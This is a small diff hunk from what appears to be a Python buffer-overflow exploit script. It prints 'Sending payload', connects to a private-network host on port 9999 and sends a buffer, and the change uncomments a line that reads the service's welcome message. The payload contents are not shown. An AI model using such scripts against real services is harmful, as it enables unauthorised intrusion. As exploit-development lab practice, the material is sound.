@@ -46,6 +46,6 @@ print "[*] Sending payload"
 
 expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 expl.connect(("192.168.35.6", 9999))
-#expl.recv(1024) # read welcome message
+expl.recv(1024) # read welcome message
 expl.send(buf)
 expl.close()
